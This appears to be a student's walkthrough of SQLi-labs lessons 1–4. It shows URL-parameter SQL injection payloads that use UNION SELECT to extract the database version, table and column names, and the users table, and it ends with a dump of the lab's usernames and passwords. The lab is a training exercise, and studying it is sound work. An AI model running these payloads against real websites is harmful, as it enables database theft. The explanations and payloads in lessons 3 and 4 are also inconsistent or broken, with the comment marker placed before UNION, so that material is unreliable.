#SQLi Labs
First we have to set up sqli labs
For that we can use the following commands
install apache2 webserver by > sudo apt install apache2
install mysql by > sudo apt-get install mysql-srver
install php7
git clone the repository of the lab and start all the services.

#LESS1
The website says,Please input the ID as parameter with numeric value.
So we can input ?id=1 or 2,3,4,5.....
when we put ' we get sql error 
thus we have a sql injection
we can comment ou the rest of the query by -- - or other comments in sql language.
We can dump contents

 payloads to dump
 We can get version of the server by using /?id=-1' union select 1,version(),3--+
 We can get databasename of the server by using /?id=-1' union select 1,database(),3--+  databasename = security
 Going to the terminal and going to mysql. If we type show databases; it shows databases
 Then we can security also. We can find more details using "use security we can go into the database.
 Using show tables; we can see the tables. For looking into the tables desc emails; and so on...
 
#LESS2
The website says,Please input the ID as parameter with numeric value.
This time when we input use ?id=1'-- - doesn't work.
So we put ' before the 1 and change it as ?id='1' as payload.
Now we can comment it ?id='1' -- - 
Now we can dump contents using the payloads.

#payloads to dump
to find column_name ?id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
We have more payloads that can we do and get contents of database

#LESS3
The website says,Please input the ID as parameter with numeric value.
This time when we input use ?id=1'-- - nor ?id='1'-- - doesn't work.
So we put ) before the ' and change it as ?id=1)' as payload.
No we can comment it ?id=1)'-- -
Now we can dump contents using payloads

#payloads to dump
to find data /?id=-1') union select 1,group_concat(username),3 from users
We have more payloads that can we do and get contents of database

#LESS4
The website says,Please input the ID as parameter with numeric value.
We have to use ') ' as payload 
Now can comment it using ?id=1' ")-- -
Now we can dump contents using payloads

#payloads to dump 
?id=-1' ")-- - union select 1,group_concat(username),group_concat(password) from users
We have more payloads that can we do and get contents of database.

#contents of database
1.databasename = security
2.tables = emails,referers,uagents,users
3.columns = CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
4.usernames = Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
password = Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
